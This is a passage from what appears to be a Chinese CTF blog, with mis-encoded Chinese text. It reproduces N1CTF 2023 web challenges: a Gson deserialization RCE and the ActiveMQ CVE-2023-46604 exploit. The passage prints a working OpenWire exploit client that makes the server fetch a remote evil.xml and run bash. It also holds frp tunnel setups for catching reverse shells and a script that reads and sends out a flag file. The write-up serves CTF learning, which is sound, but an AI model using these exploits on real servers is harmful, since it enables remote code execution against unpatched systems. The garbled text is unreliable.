catch (Exception e)&#123;&#125; &#125; &#125; çœ‹ç€çœ¼ç†Ÿå—ï¼Œæ²¡é”™ï¼Œå°±æ˜¯ godzillağŸ. ğŸ‘´åœ¨å¹¿ä¸ºæµä¼ çš„ Spring å†…å­˜ğŸçš„åŸºç¡€ä¸Šï¼Œå¼•å…¥äº† godzillağŸçš„é€»è¾‘. kali_tips ä¹‹åè¿›è¡Œä¸€æ³¢ MSF ä¸Šçº¿ï¼Œä»€ä¹ˆï¼Œä½ è¯´ kali ä¸å‡ºç½‘ï¼Œæ²¡æ³•åå¼¹ shell?ğŸ‘´æ¥å‘Šè¯‰ä½ æ€ä¹ˆåŠ. é¦–å…ˆä½ éœ€è¦ä¸€ä¸ªå…¬ç½‘ IP,ğŸ¤£ğŸ¤£ğŸ¤£ğŸ¤£ğŸ¤£ å…¬ç½‘ä¸Šèµ·ä¸ª frps,frps.ini å¦‚ä¸‹ 1234567891011121314[common]bind_port = 7000dashboard_user = admindashboard_pwd = frpadmin@2023dashboard_port = 7500heartbeat_timeout = 30token=frpToken@admin2023[common]server_addr = your_ip//è¿™ä¸ªipæ˜¯ä»¥ç›®æ ‡é¶æœºèƒ½è®¿é—®åˆ°ä¸ºå‡†server_port = 7000vhost_http_port = 9001vhost_ssh_port = 9002vhost_tcp_port = 9003 ç„¶åç¡®ä¿ kali èƒ½è®¿é—®ä½ çš„å…¬ç½‘ ip, æ¥ç€ kali èµ· frpc, é…ç½®å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031[common]server_addr = ip//è¿™ä¸ªipä»¥kalièƒ½è®¿é—®åˆ°ä¸ºå‡†server_port = 7000 token = frpToken@admin2023 [web]type = httplocal_ip = 0.0.0.0local_port = 80 custom_domains = ipremote_port = 9001 #kali ssh[ssh]type = tcplocal_ip = 0.0.0.0local_port = 22custom_domains = ipremote_port = 9002 #tcp msfconsole[tcp]type = tcplocal_ip = 0.0.0.0local_port = 9003custom_domains = ipremote_port = 9003 è¿™é‡Œè¦æ³¨æ„åˆ°çš„æ˜¯ï¼Œfrps çš„æœåŠ¡ ip å’Œ frpc çš„æœåŠ¡ ip ä¸ä¸€æ ·. åœ¨æ¸—é€çš„æ—¶å€™ï¼Œå¾€å¾€æ˜¯ windows ä¸»æœºè¿›å…¥å±€åŸŸç½‘ï¼Œkali ä¸è¿›ï¼Œé‚£ä¹ˆ frps çš„ ip é…ç½®å°±è¦ä»¥ä¸»æœºåœ¨å±€åŸŸç½‘ ip ä¸ºå‡†ï¼Œè€Œ frpc çš„ ip é…ç½®ï¼Œä»¥ NAT æ¨¡å¼é…ç½®çš„å±€åŸŸç½‘ä¸ºå‡†. ç„¶å msf ç”Ÿæˆåå¼¹ shell ç›‘å¬ä¸Šçº¿å•¥çš„å°±ä¸æˆé—®é¢˜ï¼Œä¸è¿‡ ip è¦è®¾ç½®æˆæ˜ å°„åçš„ ip.","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]},{"title":"N1CTF_å¤ç°","slug":"N1CTF-å¤ç°","date":"2023-12-01T00:48:46.000Z","updated":"2023-12-02T00:13:46.186Z","comments":true,"path":"2023/12/01/N1CTF-å¤ç°/","link":"","permalink":"https://1llustrious.github.io/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"å†™åœ¨å‰é¢ StrangePort åˆ†æğŸ¤” gtmdapachemq ç¯å¢ƒæ­å»º æµç¨‹åˆ†æ åˆ†æå¦‚ä½•åˆ©ç”¨åˆ° createThrowableğŸ˜Š Java Message Service(JMS) æ‰“ tmd é¢˜ç›®ğŸ˜¡ ez_maria æºç åˆ†æ UDF å†™ soğŸ¤ª ç‰›é­”çš„ä»€ä¹ˆäº‹ capabilities æƒé™ğŸ˜“ å…¶ä¸€ å…¶äºŒ åŠ«æŒ php ytiruces ggbondâ€™s gogs dockerdebug å†™åœ¨å‰é¢ å¤ªé¡¶äº†è¿™æ¯”èµ›ï¼Œè¿˜å¾—å¤ç°å­¦å¾ˆå¤šä¸œè¥¿. ç¯å¢ƒ: GitHub - Nu1LCTF/n1ctf-2023 å‚è€ƒ: [N1CTF 2023 Web èµ›åå¤ç° Writeup - Boogiepop Doesnâ€™t Laugh (boogipop.com)](https://boogipop.com/2023/11/06/N1CTF 2023 Web èµ›åå¤ç° Writeup/#StrangePort) [N1CTF 2023 writeup (qq.com)](https://mp.weixin.qq.com/s/HQgtWIVNFyt-uN-tJDTXAw#:~:text=ggbondâ€™s ggos) 2023n1ctf wp (qq.com) DJB!!!ğŸ˜ğŸ¥° æˆ‘å¯å¤ªå–œæ¬¢å¤§ B è€å¸ˆäº†ğŸ¥µ, å—ä¸äº†ï¼ï¼ï¼1, çˆ†äº†ï¼ StrangePort å¼€äº†ä¸ªæœåŠ¡ï¼Œé€šè¿‡ nginx åä»£ï¼Œé¢˜ç›®ä¸å‡ºç½‘ï¼Œmd å°±è¿™ä¹ˆæƒ³æ¶å¿ƒğŸ‘´å—ğŸ˜… é¢˜ç›®ç»™çš„ controller 12345678910111213141516171819202122232425262728293031323334//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.api;import com.google.gson.Gson;import java.nio.charset.StandardCharsets;import java.util.Base64;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController@RequestMapping(&#123;&quot;/api&quot;&#125;)public class APIController &#123; public APIController() &#123; &#125; @GetMapping(&#123;&quot;/&quot;&#125;) public String index() throws Exception &#123; return &quot;try /api/com.api.Person/eyJuYW1lIjoidXNlciIsImFnZSI6IjIwIn0=&quot;; &#125; @GetMapping(&#123;&quot;/&#123;Person&#125;/&#123;Json&#125;&quot;&#125;) public Person handleApiRequest(@PathVariable String Person, @PathVariable String Json) throws Exception &#123; Gson gson = new Gson(); Person person = (Person)gson.fromJson(new String(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person)); return person; &#125;&#125; ç”¨è‡ªå·±âˆšâ…§ æƒ³æƒ³éƒ½çŸ¥é“è¦é€šè¿‡ Gson æ‰“ä¸€ä¸ª RCE. åˆ†æğŸ¤” ä¸å¤šè¯´ï¼Œå…ˆ debug çœ‹ä¸€ä¸‹èƒ½ä¸èƒ½å‡ºç‚¹ä»€ä¹ˆä¿¡æ¯. 12345678910111213141516import com.api.Person;import com.google.gson.Gson;import java.lang.reflect.InvocationTargetException;import java.nio.charset.StandardCharsets;import java.util.Base64;public class GsonDemo &#123; public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException &#123; String Json=&quot;eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=&quot;; String Person=&quot;Person&quot;; Gson gson = new Gson(); com.api.Person o = (Person) gson.fromJson(new String(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person)); &#125;&#125;// éšä¾¿ç»™ä¸ª base64 æ¥ä¸ª PersonğŸ˜¤ 123456789101112131415161718192021222324252627282930313233343536373839 public class Person &#123; public Person() &#123; System.out.println(1111); &#125; public String name = &quot;john&quot;; public String age = &quot;11&quot;; public String toString() &#123; return &quot;Person&#123;name=&#x27;&quot; + this.name + &quot;&#x27;, age=&#x27;&quot; + this.age + &quot;&#x27;&#125;&quot;; &#125; public Person(String name, String age) &#123; this.name = name; this.age = age; &#125; Object writeReplace() &#123; System.out.println(&#x27;1&#x27;); return 1; &#125; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getAge() &#123; return this.age; &#125; public void setAge(String age) &#123; this.age = age; &#125;&#125; å¯ä»¥çœ‹åˆ°æœ‰æ„é€ æ–¹æ³•ï¼Œå°±ä¼šå»è°ƒç”¨ï¼Œæ²¡æœ‰çš„è¯ï¼Œå°±ä¼šè°ƒç”¨ Unsafe å®ä¾‹åŒ–. æ‰€ä»¥ï¼Œæ€è€ƒä¸€ä¸‹æ€ä¹ˆé€šè¿‡ construct åˆ° RCE.ğŸ˜¤ è¿™é‡Œå°±å¯ä»¥å°è¯•ç”¨ä¸€ä¸ª PrintServiceLookupProvider , äº‹å®ä¸Šåªè¦å®ç°äº† PrintServiceLookup ç±»çš„éƒ½è¡Œ. å†™ä¸ª demo å»è°ƒè¯•ä¸€ä¸‹ğŸ¤£ 1234567891011121314151617181920212223242526272829303132333435import java.io.IOException;public class Person &#123; public Person() throws IOException &#123; Runtime.getRuntime().exec(&quot;whoami&quot;+age); &#125; public String name = &quot;john&quot;; public String age = &quot;11&quot;; public String toString() &#123; return &quot;Person&#123;name=&#x27;&quot; + this.name + &quot;&#x27;, age=&#x27;&quot; + this.age + &quot;&#x27;&#125;&quot;; &#125; public Person(String name, String age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getAge() &#123; return this.age; &#125; public void setAge(String age) &#123; this.age = age; &#125;&#125; å°è¯•å‘½ä»¤æ‹¼æ¥ ä¸å‡ºæ„å¤–åœ°å‡ºæ„å¤–äº†ğŸ˜…ğŸ˜“ å¤§ B è€å¸ˆè¯´ï¼ŒPrintService æ˜¯ä¼šæ–°å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œè¿›è¡Œä¸€ä¸ªé‡å¤å¾ªç¯å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import java.io.IOException;import java.io.Writer;public class Person &#123; class RceThread implements Runnable&#123; @Override public void run() &#123; while (true) &#123; try &#123; Runtime.getRuntime().exec(age); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; &#125; &#125; &#125; public Person() throws IOException &#123; Thread thr = new Thread(null, new Person.RceThread(), &quot;Rce&quot;, 0, false); thr.setDaemon(true); thr.start(); &#125; public String name = &quot;john&quot;; public String age = &quot;11&quot;; public String toString() &#123; return &quot;Person&#123;name=&#x27;&quot; + this.name + &quot;&#x27;, age=&#x27;&quot; + this.age + &quot;&#x27;&#125;&quot;; &#125; public Person(String name, String age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getAge() &#123; return this.age; &#125; public void setAge(String age) &#123; this.age = age; &#125;&#125; è®¿é—® 1http://127.0.0.1:8877/api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0= rce æˆåŠŸ md æœ¬åœ° jdk æ–¹æ³•ä¸å¤ªä¸€æ ·ï¼Œè°ƒä¸å‡ºæ¥ï¼Œå€Ÿç”¨ä¸€ä¸‹å¤§ B è€å¸ˆçš„å›¾å›¾. gtmdapachemq Apache ActiveMQ (ç‰ˆæœ¬ &lt; 5.18.3) RCE åˆ†æ - X1r0z Blog (exp10it.cn) CVE-2023-46604 activemq&lt;5.18.3 RCE åˆ†æ - KingBridge - åšå®¢å›­ (cnblogs.com) ç¯å¢ƒæ­å»º 12345678FROM apache/activemq-classic:5.17.5RUN apt-get updateRUN apt-get install wget curl netcat -yEXPOSE 61616EXPOSE 5005CMD [ &quot;tail&quot;,&quot;-f&quot;,&quot;/dev/null&quot; ] ä¸å¤šè¯´äº†ï¼Œ5005 ç”¨äº debug ç”¨ï¼Œ æ‰¾åˆ° /opt/apache-activemq/bin/linux-x86-64/wrapper.conf åŠ ä¸Šä¸€å¥ 1wrapper.java.additional.14=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 è¿è¡Œ 1/opt/apache-activemq/bin/linux-x86-64/activemq console ğŸ‘´å…ˆæŠŠ exp æ”¾è¿™ï¼Œæ¥ç€è·Ÿç€ğŸ‘´åˆ†æè¿™æ€ä¹ˆä¸ªäº‹ 12345678910111213141516171819202122232425262728293031323334package org.example;import javax.xml.crypto.Data;import java.io.DataOutputStream;import java.io.IOException;import java.io.OutputStream;import java.net.Socket;public class ScratchExploit &#123; public static void main(String[] args) throws IOException &#123; Socket socket = new Socket(&quot;127.0.0.1&quot;, 61616); OutputStream os = socket.getOutputStream(); DataOutputStream dos = new DataOutputStream(os); dos.writeInt(0);// size dos.writeByte(31);// type dos.writeInt(0);// CommandId dos.writeBoolean(false);// Command response required dos.writeInt(0);// CorrelationId // body dos.writeBoolean(true); // UTF dos.writeBoolean(true); dos.writeUTF(&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;); dos.writeBoolean(true); dos.writeUTF(&quot;http://192.168.111.1:8888/evil.xml&quot;); dos.close(); os.close(); socket.close(); &#125;&#125; 1234567891011&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[touch /tmp/pwned]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; èµ·ä¸ª python çš„ http æœåŠ¡ï¼Œåˆ«è·ŸğŸ‘´è¯´ä½ ä¸ä¼šå“¦. æµç¨‹åˆ†æ ã“ã“ã¯æ–­ç‚¹ğŸ˜¤ åœ¨è¿™é‡Œä¼šè¿›è¡Œä»»æ„ç±»çš„æœ‰å‚å®ä¾‹åŒ–ï¼Œè€Œ ApacheMQ æ˜¯åŸºäº spring çš„ï¼Œæ‰€ä»¥è‡ªç„¶ä¼šæœ‰ ClassPathXmlApplicationContext è¿™ä¸ªç±»ï¼Œæˆ‘ä»¬è®©ä»–è¿›è¡Œå®ä¾‹åŒ–ï¼Œå³å¯å®Œæˆ RCEï¼Œè¿™ä¸ªåˆ©ç”¨éœ€è¦å‡ºç½‘è®¿é—®å…¬ç½‘ ip çš„æ¶æ„ xmlã€‚ åˆ†æå¦‚ä½•åˆ©ç”¨åˆ° createThrowableğŸ˜Š Java Message Service(JMS) ğŸ‘´ä¹Ÿä¸æ˜¯å¾ˆæ‡‚æ˜¯å•¥ç©æ„ï¼Œåæ­£è·ŸæœåŠ¡æœ‰å…³å—ï¼Œç®€å•æŠ„ä¸€ä¸‹æ¦‚å¿µæ”¾ä¸ŠğŸ˜’ğŸ¤£ Java Message Serviceï¼ˆJMSï¼‰æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºã€å‘é€ã€æ¥æ”¶å’Œç®¡ç†æ¶ˆæ¯çš„ Java APIï¼Œé€šå¸¸ç”¨äºæ„å»ºåˆ†å¸ƒå¼åº”ç”¨ç¨‹åºã€‚JMS æ˜¯ Java EEï¼ˆEnterprise Editionï¼‰è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒæä¾›äº†ä¸€ç§æ ‡å‡†çš„æ–¹æ³•æ¥å®ç°å¼‚æ­¥é€šä¿¡ï¼Œä½¿ä¸åŒç»„ä»¶ã€åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿèƒ½å¤Ÿå¯é åœ°äº¤æ¢æ¶ˆæ¯ã€‚ æ¦‚å¿µ: æ¶ˆæ¯ï¼ˆMessageï¼‰ï¼šJMS æ¶ˆæ¯æ˜¯ä¸€ç§ç”¨äºåœ¨åº”ç”¨ç¨‹åºä¹‹é—´ä¼ é€’ä¿¡æ¯çš„æ•°æ®åŒ…ã€‚æ¶ˆæ¯å¯ä»¥åŒ…å«æ–‡æœ¬ã€å­—èŠ‚ã€Mapã€å¯¹è±¡ç­‰ä¸åŒç±»å‹çš„æ•°æ®ã€‚ æ¶ˆæ¯ç”Ÿäº§è€…ï¼ˆMessage Producerï¼‰ï¼šæ¶ˆæ¯ç”Ÿäº§è€…æ˜¯è´Ÿè´£åˆ›å»ºå’Œå‘é€æ¶ˆæ¯çš„åº”ç”¨ç¨‹åºç»„ä»¶ã€‚å®ƒå°†æ¶ˆæ¯å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—æˆ–ä¸»é¢˜ã€‚ æ¶ˆæ¯æ¶ˆè´¹è€…ï¼ˆMessage Consumerï¼‰ï¼šæ¶ˆæ¯æ¶ˆè´¹è€…æ˜¯è´Ÿè´£æ¥æ”¶å’Œå¤„ç†æ¶ˆæ¯çš„åº”ç”¨ç¨‹åºç»„ä»¶ã€‚å®ƒè®¢é˜…ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æˆ–ä¸»é¢˜ï¼Œä»¥æ¥æ”¶å‘é€åˆ°è¯¥é˜Ÿåˆ—æˆ–ä¸»é¢˜çš„æ¶ˆæ¯ã€‚ æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆQueueï¼‰ï¼šæ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä¸€ç§ç‚¹å¯¹ç‚¹ï¼ˆPoint-to-Pointï¼‰é€šä¿¡æ¨¡å‹ï¼Œå…¶ä¸­æ¶ˆæ¯ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°ç‰¹å®šé˜Ÿåˆ—ï¼Œè€Œæ¶ˆæ¯æ¶ˆè´¹è€…ä»é˜Ÿåˆ—æ¥æ”¶æ¶ˆæ¯ã€‚æ¯æ¡æ¶ˆæ¯åªèƒ½è¢«ä¸€ä¸ªæ¶ˆè´¹è€…æ¥æ”¶ã€‚ ä¸»é¢˜ï¼ˆTopicï¼‰ï¼šä¸»é¢˜æ˜¯ä¸€ç§å‘å¸ƒ / è®¢é˜…ï¼ˆPublish/Subscribeï¼‰é€šä¿¡æ¨¡å‹ï¼Œå…¶ä¸­æ¶ˆæ¯ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°ä¸»é¢˜ï¼Œè€Œæ‰€æœ‰è®¢é˜…äº†è¯¥ä¸»é¢˜çš„æ¶ˆæ¯æ¶ˆè´¹è€…éƒ½ä¼šæ¥æ”¶è¯¥æ¶ˆæ¯ã€‚ è¿æ¥å·¥å‚ï¼ˆConnection Factoryï¼‰ï¼šè¿æ¥å·¥å‚æ˜¯ç”¨äºåˆ›å»º JMS è¿æ¥çš„å·¥å‚å¯¹è±¡ã€‚è¿æ¥æ˜¯ä¸æ¶ˆæ¯ä»£ç†ï¼ˆå¦‚æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å™¨ï¼‰çš„è¿æ¥ï¼Œå®ƒè´Ÿè´£ç®¡ç†ä¼šè¯å’Œæ¶ˆæ¯çš„ä¼ é€’ã€‚ ä¼šè¯ï¼ˆSessionï¼‰ï¼šä¼šè¯æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œç”¨äºå‘é€å’Œæ¥æ”¶æ¶ˆæ¯ã€‚å®ƒæä¾›äº†äº‹åŠ¡æ€§å’Œéäº‹åŠ¡æ€§ä¼šè¯é€‰é¡¹ï¼Œä»¥ç¡®ä¿æ¶ˆæ¯çš„å¯é ä¼ é€’ã€‚ æ¶ˆæ¯ä»£ç†ï¼ˆMessage Brokerï¼‰ï¼šæ¶ˆæ¯ä»£ç†æ˜¯ä¸€ä¸ªä¸­é—´ä»¶ç»„ä»¶ï¼Œè´Ÿè´£æ¥æ”¶ã€å­˜å‚¨å’Œè·¯ç”±æ¶ˆæ¯ã€‚å¸¸è§çš„ JMS æ¶ˆæ¯ä»£ç†åŒ…æ‹¬ Apache ActiveMQã€RabbitMQ å’Œ IBM WebSphere MQ ç­‰ã€‚ åœ¨ JMS ä¸­ï¼Œproducer client å’Œ consumer client å¼‚æ­¥åœ°å‘ broker å»ºç«‹è¿æ¥ã€‚Queue æ˜¯å¯æ¶ˆè€—æ€§çš„ï¼Œtopic æ˜¯æ— é™çš„ã€‚ğŸ˜… 12345678910111213141516171819202122232425package org.example;import org.apache.activemq.ActiveMQConnectionFactory;import javax.jms.*;/** * Hello world! * */public class App&#123; public static void main(String[] args) throws Exception &#123; ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(&quot;tcp://localhost:61616&quot;); Connection connection = connectionFactory.createConnection(); connection.start(); Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Destination destination = session.createQueue(&quot;tempQueue&quot;); MessageProducer producer = session.createProducer(destination); Message message = session.createObjectMessage(&quot;123&quot;); producer.send(message); connection.close(); &#125;&#125; é¦–å…ˆåˆ›é€ è¿æ¥ï¼Œæ‰“æœ¬åœ°çš„ 616 ç«¯å£æœåŠ¡ï¼Œé‡ç‚¹åœ¨ Destination destination = session.createQueue(&quot;tempQueue&quot;); ï¼šåˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ã€‚è¿™é‡Œä½¿ç”¨ createQueue() æ–¹æ³•åˆ›å»ºäº†ä¸€ä¸ªåä¸º &quot;tempQueue&quot; çš„é˜Ÿåˆ—ã€‚è¿™æ˜¯ä¸€ä¸ªç‚¹å¯¹ç‚¹é€šä¿¡æ¨¡å‹çš„é˜Ÿåˆ—ã€‚ ä¸€èˆ¬æ¥è¯´ Producer å°†æ¶ˆæ¯æ”¾åœ¨é˜Ÿåˆ—ä¹‹ä¸­ï¼Œå…è®¸å…¶ä»–åº”ç”¨ç¨‹åºæˆ–ç»„ä»¶ä»è¯¥é˜Ÿåˆ—æ¥æ”¶æ¶ˆæ¯. activemq çš„ broker å’Œ client ç”¨ OpenWire åº”ç”¨å±‚åè®®é€šä¿¡ï¼Œä¼ è¾“å±‚ç”¨çš„æ˜¯ TCP åè®®ã€‚ OpenWire é€šä¿¡çš„åŒ…ä¼šåœ¨ org.apache.activemq.openwire#doUnmarshal ååºåˆ—åŒ– OpenWireï¼ˆä¹Ÿç§°ä¸º ActiveMQ OpenWireï¼‰æ˜¯ Apache ActiveMQ æ¶ˆæ¯ä»£ç†çš„äºŒè¿›åˆ¶åè®®ï¼Œç”¨äºåœ¨æ¶ˆæ¯ä»£ç†å’Œ JMS å®¢æˆ·ç«¯ä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚å®ƒæ˜¯ä¸€ç§ç´§å‡‘çš„ã€é«˜æ•ˆçš„åè®®ï¼Œæ—¨åœ¨æä¾›å¿«é€Ÿçš„æ¶ˆæ¯ä¼ é€’æ€§èƒ½ã€‚ğŸ‘´ç®€å•è¯´åˆ°è¿™ï¼Œä¸æƒ³é•¿ç¯‡å¤§å¹…å†™äº† (à° àµ à° )ï¾‰ ä¸Š tnd æ–­ç‚¹ ![1699354951791](./assets/1699354951791.png é˜¿ç±³è¯ºæ–¯ï¼Œæéº»éº»åœ°æŠ¥é”™ å“¦ï¼Œæºèµ–æ°æ²¡æœ‰è¿™ä¸ªç±»ï¼Œntmd ä¸æ—©è¯´ 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.17.1&lt;/version&gt; &lt;!-- ä½¿ç”¨é€‚å½“çš„ç‰ˆæœ¬ --&gt; &lt;/dependency&gt; maven é‡æ–°åŠ è½½çš„æ—¶å€™åˆ tmd æŠŠè‡ªå·±åŠ çš„ä¾èµ–å»æ‰äº†ï¼Œé‡æ–°åŠ ä¸€ä¸‹. è¿è¡Œåï¼Œèµ°åˆ°æ–­ç‚¹å¤„ æ ¹æ® dataType æŒ‡å®šçš„ DataStreamMarshaller å®ç°ç±»ï¼Œè°ƒç”¨ createObject æ–¹æ³•ã€‚ç„¶åæ ¹æ® tightEncodingEnabled é€‰æ‹© tightUnmarshal æˆ– looseUnmarshal ä¸€æ¬¡ ApacheMQ çš„é€šè®¯è¯·æ±‚ä¸­ä¼šä¸æ–­çš„æœ‰ marshal å’Œ dounmarshal çš„æ“ä½œ è€Œ ExceptionResponseMarshaller æœ‰ tightUnmarhsal æ–¹æ³•ï¼Œä¼šè¿›å…¥å…¶ tightUnmarhsal æ–¹æ³•ï¼Œæ˜¯ BaseDataStreamMarshaller çš„å­ç±» ä»€ä¹ˆï¼Ÿä½ é—®ä»€ä¹ˆæ˜¯ BaseDataStreamMarshaller ? ä¸å°±æ˜¯æœ€ç»ˆæ¼æ´åˆ©ç”¨ç‚¹çš„åœ°æ–¹å—. ExceptionResponseMarshaller#looseUnmarshal ä¼šè°ƒç”¨ looseUnmarsalThrowableï¼Œä»è€Œè°ƒç”¨ org.apache.activemq.openwire.v12.BaseDataStreamMarshaller#createThrowable åˆ°è¾¾æ¼æ´åˆ©ç”¨ç‚¹. æéº»éº»åœ°ï¼Œå¥½âˆšâ…§ éš¾è°ƒï¼Œnmd ä¸€æ¬¡è¿˜æœ‰æ—¶é—´é™åˆ¶ èµ°åˆ° looseUnmarsalThrowable è¿™é‡Œå°±è¿›å…¥äº†æ¶æ„æ–¹æ³•ï¼Œè‡³æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶ clazz å’Œ message å› ä¸º ExceptionResponseMarshaller ä¹Ÿæœ‰ marshal æ–¹æ³•ï¼Œæ‰€ä»¥å°±ç ”ç©¶å¦‚ä½•å»å‘é€ä¸€ä¸ªç»ç”±è¿™ä¸ª marshaller å¤„ç†çš„ ExceptionResponse oneway æ–¹æ³•ä¼šè°ƒç”¨ wireFormat.marshal() å»åºåˆ—åŒ– command command å°±æ˜¯å‰é¢å‡†å¤‡å‘é€çš„ ObjectMessage , è€Œ wireFormat å°±æ˜¯å’Œå®ƒå¯¹åº”çš„åºåˆ—åŒ–å™¨ é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰‹åŠ¨ patch è¿™ä¸ªæ–¹æ³•ï¼Œå°† command æ”¹æˆ ExceptionResponse, å°† wireFormat æ”¹æˆ ExceptionResponseMarshaller å³å¯ this.wireFormat.marshal(command, this.dataOut); æˆ‘ä»¬åœ¨è¿™é‡Œæ‰‹åŠ¨ patch å…¶ä¸­ command ä¸º CPX ç±»ï¼Œæˆ‘ä»¬çš„åšæ³•å¾ˆç®€å•ï¼Œä¹Ÿåªéœ€è¦å†™ä¸€ä¸ªç›¸åŒçš„åŒ…åï¼Œè¿™æ ·ç”±äºæ–¹æ³•è°ƒç”¨æœºåˆ¶ï¼Œä¼šä¼˜å…ˆå¯»æ‰¾æˆ‘ä»¬é‡å†™çš„ç±»ï¼Œç„¶åè°ƒç”¨å…¶ä¸­çš„ onway æ–¹æ³•ã€‚ 1234567public void oneway(Object command) throws IOException &#123; this.checkStarted(); Throwable context = new ClassPathXmlApplicationContext(&quot;http://8.130.24.188:8000/rce.xml&quot;); ExceptionResponse exceptionResponse = new ExceptionResponse(context); this.wireFormat.marshal(exceptionResponse, this.dataOut); this.dataOut.flush();&#125; 123456789101112131415package org.springframework.context.support;public class ClassPathXmlApplicationContext extends Throwable&#123; private String message; public ClassPathXmlApplicationContext(String message) &#123; this.message = message; &#125; @Override public String getMessage() &#123; return message; &#125;&#125; æ³¨æ„é‡å†™ getMedssageï¼Œè¿™æ˜¯ä¸ºäº†è®©æœåŠ¡ç«¯è·å–åˆ° messageï¼Œä¹Ÿå°±æ˜¯å®ä¾‹åŒ–å‚æ•°ï¼‰ç»§æ‰¿ Throwable æ˜¯å› ä¸º ExceptionResponse éœ€è¦ Exception ç±»å‹ï¼Œæˆ‘ä»¬åªæ˜¯éœ€è¦ä»–çš„ç±»åå’Œä¼ å‚ã€‚ç„¶åæœåŠ¡ç«¯ä¼šæ ¹æ®è¿™ 2 ä¸ªå€¼è¿›è¡Œå®ä¾‹åŒ–. çœŸâˆšâ…§ æ¶å¿ƒï¼Œå¤ªéš¾è°ƒäº†ï¼Œè€æ˜¯æ‰è¿æ¥. ä¼šè¿›è¡Œæœ¬åœ°åºåˆ—åŒ–ï¼Œç›´æ¥æ”¹æ–¹æ³• ç®—äº†ï¼Œæ ¹æ®æ–‡æ¡£ï¼Œæ‰“ä¸€ä¸ª sock åè®® ActiveMQ (apache.org)ğŸ˜… æ‰“ tmd é¢˜ç›®ğŸ˜¡ nmd é¢˜ç›®åä»£ä¸è®©å‡ºç½‘ï¼Œå®Œå…¨åˆ©ç”¨ä¸äº†.ğŸ˜… è‚–å¥ä»ï¼ï¼ï¼ğŸ˜¡, é¢˜ç›®æ—¢ç„¶è¿˜æœ‰ä¸€ä¸ªæŒ‚ GSON çš„æœºå­ï¼ŒğŸ‘´å°±æ‰“ tmd çš„ SSRFğŸ˜¤ å‚è€ƒ NESE çˆ¹çš„ exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.activemq.ActiveMQConnectionFactory;import javax.jms.*;public class Main implements MessageListener &#123; private void publish() throws Exception &#123; javax.jms.ConnectionFactory factory; factory = new ActiveMQConnectionFactory(&quot;tcp://127.0.0.1:61616&quot;); Connection connection = factory.createConnection(); Session pubSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Queue queue = pubSession.createQueue(&quot;flagqueue&quot;); MessageProducer publisher = pubSession.createProducer(queue); String[] cmd = new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;cat /flag&quot;&#125;; byte[] bs = new Scanner(new ProcessBuilder(cmd).start().getInputStream()) .useDelimiter(&quot;\\\\A&quot;) .next() .getBytes(); String message = new String(bs); TextMessage msg = pubSession.createTextMessage(); msg.setText(message); publisher.send(msg); System.out.println(&quot;publish finished&quot;); connection.close(); &#125; private void consume() throws Exception &#123; ConnectionFactory factory = new ActiveMQConnectionFactory(&quot;tcp://xxx:61616&quot;); Connection connection = factory.createConnection(); Session 